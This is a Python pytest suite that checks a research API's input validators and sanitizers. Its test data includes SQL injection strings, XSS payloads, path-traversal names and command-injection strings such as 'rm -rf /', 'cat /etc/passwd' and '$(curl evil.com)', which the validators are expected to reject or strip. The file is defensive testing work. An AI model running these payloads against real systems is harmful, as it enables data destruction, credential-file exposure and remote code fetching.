"""
Security module test suite

Tests input validation, sanitization, rate limiting,
and security measures.
"""

import pytest
from pydantic import ValidationError
from datetime import datetime
import json

from src.api.security.validation import (
    ResearchQueryValidator,
    WebSocketMessageValidator,
    ErrorResponse,
    SanitizationUtils,
    validate_user_id,
    validate_session_id,
    validate_api_key
)


class TestResearchQueryValidator:
    """Test research query validation and sanitization"""
    
    def test_valid_query(self):
        """Test validation of valid queries"""
        
        valid_queries = [
            {"query": "What is quantum computing?"},
            {"query": "Explain machine learning", "mode": "comprehensive"},
            {"query": "Climate change impacts", "mode": "quick", 
             "focus_areas": ["science", "policy"]},
            {"query": "AI ethics", "language": "en"}
        ]
        
        for query_data in valid_queries:
            validator = ResearchQueryValidator(**query_data)
            assert validator.query == query_data["query"]
    
    def test_query_length_validation(self):
        """Test query length constraints"""
        
        # Too short
        with pytest.raises(ValidationError):
            ResearchQueryValidator(query="AI")
        
        # Too long
        with pytest.raises(ValidationError):
            ResearchQueryValidator(query="x" * 1001)
    
    def test_sql_injection_prevention(self):
        """Test SQL injection pattern detection"""
        
        sql_injections = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "admin' --",
            "SELECT * FROM users WHERE id = 1",
            "UNION SELECT username, password FROM users",
            "; DELETE FROM research_tasks WHERE 1=1",
            "' AND 1=1 --"
        ]
        
        for injection in sql_injections:
            with pytest.raises(ValueError, match="Invalid query format"):
                ResearchQueryValidator(query=injection)
    
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<svg onload=alert('XSS')>"
        ]
        
        for xss in xss_attempts:
            # Should clean HTML but not raise error for XSS
            validator = ResearchQueryValidator(query=f"Research about {xss}")
            assert "<script>" not in validator.query
            assert "javascript:" not in validator.query
            assert "onerror=" not in validator.query
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        
        command_injections = [
            "test; rm -rf /",
            "query | cat /etc/passwd",
            "research `whoami`",
            "data $(curl evil.com)",
            "test && wget malware.com"
        ]
        
        for cmd in command_injections:
            with pytest.raises(ValueError, match="Invalid query format"):
                ResearchQueryValidator(query=cmd)
    
    def test_mode_validation(self):
        """Test research mode validation"""
        
        # Valid modes
        for mode in ["quick", "comprehensive", "continuous"]:
            validator = ResearchQueryValidator(query="Test query", mode=mode)
            assert validator.mode == mode
        
        # Invalid mode
        with pytest.raises(ValidationError):
            ResearchQueryValidator(query="Test", mode="invalid_mode")
    
    def test_focus_areas_sanitization(self):
        """Test focus areas sanitization"""
        
        # Valid focus areas
        validator = ResearchQueryValidator(
            query="Test",
            focus_areas=["science", "technology", "medicine"]
        )
        assert len(validator.focus_areas) == 3
        
        # With HTML attempts
        validator = ResearchQueryValidator(
            query="Test",
            focus_areas=["<b>science</b>", "tech<script>alert()</script>"]
        )
        assert validator.focus_areas == ["science", "techalert()"]
        
        # Too many focus areas
        with pytest.raises(ValidationError):
            ResearchQueryValidator(
                query="Test",
                focus_areas=["area" + str(i) for i in range(11)]
            )
    
    def test_extra_fields_forbidden(self):
        """Test that extra fields are not allowed"""
        
        with pytest.raises(ValidationError):
            ResearchQueryValidator(
                query="Test",
                extra_field="should_fail"
            )


class TestWebSocketMessageValidator:
    """Test WebSocket message validation"""
    
    def test_valid_messages(self):
        """Test validation of valid WebSocket messages"""
        
        valid_messages = [
            {"type": "research_query"},
            {"type": "ping", "session_id": "550e8400-e29b-41d4-a716-446655440000"},
            {"type": "export_results", "data": {"format": "pdf"}}
        ]
        
        for msg in valid_messages:
            validator = WebSocketMessageValidator(**msg)
            assert validator.type == msg["type"]
    
    def test_message_type_validation(self):
        """Test message type validation"""
        
        # Valid types
        valid_types = [
            "research_query", "follow_up_question", "cancel_research",
            "get_status", "export_results", "share_research", "ping"
        ]
        
        for msg_type in valid_types:
            validator = WebSocketMessageValidator(type=msg_type)
            assert validator.type == msg_type
        
        # Invalid type
        with pytest.raises(ValueError, match="Unknown message type"):
            WebSocketMessageValidator(type="hack_system")
    
    def test_session_id_validation(self):
        """Test session ID format validation"""
        
        # Valid UUID
        validator = WebSocketMessageValidator(
            type="ping",
            session_id="550e8400-e29b-41d4-a716-446655440000"
        )
        assert validator.session_id is not None
        
        # Invalid format
        with pytest.raises(ValidationError):
            WebSocketMessageValidator(
                type="ping",
                session_id="not-a-uuid"
            )
    
    def test_data_size_limit(self):
        """Test message data size limits"""
        
        # Large data should fail
        large_data = {"content": "x" * 11000}  # Over 10KB
        
        with pytest.raises(ValueError, match="Message data too large"):
            WebSocketMessageValidator(
                type="research_query",
                data=large_data
            )


class TestErrorResponse:
    """Test error response standardization"""
    
    def test_standard_errors(self):
        """Test standard error responses"""
        
        error_types = [
            "auth_failed", "rate_limited", "invalid_input",
            "server_error", "not_found"
        ]
        
        for error_type in error_types:
            response = ErrorResponse.get(error_type)
            assert "error" in response
            assert "code" in response
            assert response["code"] == error_type
            # Should not reveal technical details
            assert "stack" not in response["error"].lower()
            assert "traceback" not in response["error"].lower()
    
    def test_unknown_error_fallback(self):
        """Test fallback for unknown error types"""
        
        response = ErrorResponse.get("unknown_error_type")
        assert response["error"] == ErrorResponse.ERRORS["server_error"]
        assert response["code"] == "unknown_error_type"
    
    def test_request_id_inclusion(self):
        """Test request ID inclusion in errors"""
        
        request_id = "req_123456"
        response = ErrorResponse.get("server_error", request_id)
        assert response["request_id"] == request_id
    
    def test_http_status_mapping(self):
        """Test HTTP status code mapping"""
        
        status_tests = [
            ("auth_failed", 401),
            ("forbidden", 403),
            ("not_found", 404),
            ("rate_limited", 429),
            ("server_error", 500),
            ("unknown", 500)  # Default
        ]
        
        for error_type, expected_status in status_tests:
            status = ErrorResponse.get_http_status(error_type)
            assert status == expected_status


class TestSanitizationUtils:
    """Test data sanitization utilities"""
    
    def test_filename_sanitization(self):
        """Test filename sanitization"""
        
        test_cases = [
            ("normal_file.pdf", "normal_file.pdf"),
            ("../../../etc/passwd", "etcpasswd"),
            ("file\\with\\backslashes.txt", "filewithbackslashes.txt"),
            ("file with spaces.pdf", "filewithspaces.pdf"),
            ("file<script>.doc", "filescript.doc"),
            ("very" + "long" * 100 + ".txt", "very" + "long" * 62 + "lon.txt"),
            ("", "unnamed"),
            (".", "unnamed"),
            ("..", "unnamed")
        ]
        
        for input_name, expected in test_cases:
            sanitized = SanitizationUtils.sanitize_filename(input_name)
            assert sanitized == expected
    
    def test_url_sanitization(self):
        """Test URL validation and sanitization"""
        
        # Valid URLs
        valid_urls = [
            "https://example.com",
            "http://localhost:8080/path",
            "https://sub.domain.com/path?query=value",
            "https://192.168.1.1:3000"
        ]
        
        for url in valid_urls:
            sanitized = SanitizationUtils.sanitize_url(url)
            assert sanitized == url
        
        # Invalid/malicious URLs
        invalid_urls = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert()</script>",
            "vbscript:msgbox('hi')",
            "file:///etc/passwd",
            "about:blank",
            "not-a-url",
            "ftp://old-protocol.com"
        ]
        
        for url in invalid_urls:
            sanitized = SanitizationUtils.sanitize_url(url)
            assert sanitized is None
    
    def test_json_output_sanitization(self):
        """Test JSON output sanitization"""
        
        # Test nested structure with potential XSS
        unsafe_data = {
            "title": "<script>alert('XSS')</script>Research",
            "items": [
                {"name": "<img src=x onerror=alert()>"},
                {"name": "Safe item"}
            ],
            "metadata": {
                "author": "John<script>hack()</script>Doe",
                "count": 42,
                "active": True
            }
        }
        
        sanitized = SanitizationUtils.sanitize_json_output(unsafe_data)
        
        # Check sanitization
        assert "<script>" not in json.dumps(sanitized)
        assert "alert(" not in json.dumps(sanitized)
        assert sanitized["title"] == "alert('XSS')Research"
        assert sanitized["items"][0]["name"] == ""
        assert sanitized["metadata"]["author"] == "Johnhack()Doe"
        # Non-string values should be preserved
        assert sanitized["metadata"]["count"] == 42
        assert sanitized["metadata"]["active"] is True


class TestValidationHelpers:
    """Test validation helper functions"""
    
    def test_user_id_validation(self):
        """Test user ID validation"""
        
        # Valid user IDs
        valid_ids = [
            "user123",
            "john_doe",
            "alice-wonderland",
            "u" * 128,  # Max length
            "123456",
            "USER_2023"
        ]
        
        for user_id in valid_ids:
            assert validate_user_id(user_id) is True
        
        # Invalid user IDs
        invalid_ids = [
            "",
            "user@domain.com",  # @ not allowed
            "user space",  # Spaces not allowed
            "u" * 129,  # Too long
            "user#123",  # # not allowed
            "../etc/passwd"  # Path traversal attempt
        ]
        
        for user_id in invalid_ids:
            assert validate_user_id(user_id) is False
    
    def test_session_id_validation(self):
        """Test session ID (UUID) validation"""
        
        # Valid UUIDs
        valid_uuids = [
            "550e8400-e29b-41d4-a716-446655440000",
            "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
            "00000000-0000-0000-0000-000000000000"
        ]
        
        for uuid in valid_uuids:
            assert validate_session_id(uuid) is True
        
        # Invalid UUIDs
        invalid_uuids = [
            "not-a-uuid",
            "550e8400-e29b-41d4-a716",  # Too short
            "550e8400-e29b-41d4-a716-446655440000-extra",  # Too long
            "550E8400-E29B-41D4-A716-446655440000",  # Uppercase
            "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Invalid characters
        ]
        
        for uuid in invalid_uuids:
            assert validate_session_id(uuid) is False
    
    def test_api_key_validation(self):
        """Test API key format validation"""
        
        # Valid API keys
        valid_keys = [
            "pk_" + "a" * 32,
            "pk_" + "0123456789abcdef" * 2
        ]
        
        for key in valid_keys:
            assert validate_api_key(key) is True
        
        # Invalid API keys
        invalid_keys = [
            "invalid_key",
            "pk_short",  # Too short
            "pk_" + "x" * 33,  # Too long
            "sk_" + "a" * 32,  # Wrong prefix
            "pk_" + "!" * 32  # Invalid characters
        ]
        
        for key in invalid_keys:
            assert validate_api_key(key) is False


class TestSecurityIntegration:
    """Integration tests for security components"""
    
    def test_layered_validation(self):
        """Test multiple layers of validation working together"""
        
        # Attempt various attacks in one query
        malicious_query = """
        <script>alert('XSS')</script>
        '; DROP TABLE users; --
        $(curl evil.com)
        """
        
        # Should either sanitize or reject
        try:
            validator = ResearchQueryValidator(query=malicious_query)
            # If it passes, check sanitization
            assert "<script>" not in validator.query
            assert "DROP TABLE" not in validator.query
        except ValueError:
            # Rejection is also acceptable
            pass
    
    def test_unicode_handling(self):
        """Test proper Unicode handling in validation"""
        
        unicode_queries = [
            "研究人工智能",  # Chinese
            "Исследование ИИ",  # Russian
            "🤖 AI research 🔬",  # Emojis
            "Café résumé naïve",  # Accented characters
        ]
        
        for query in unicode_queries:
            validator = ResearchQueryValidator(query=query)
            assert validator.query == query  # Should preserve Unicode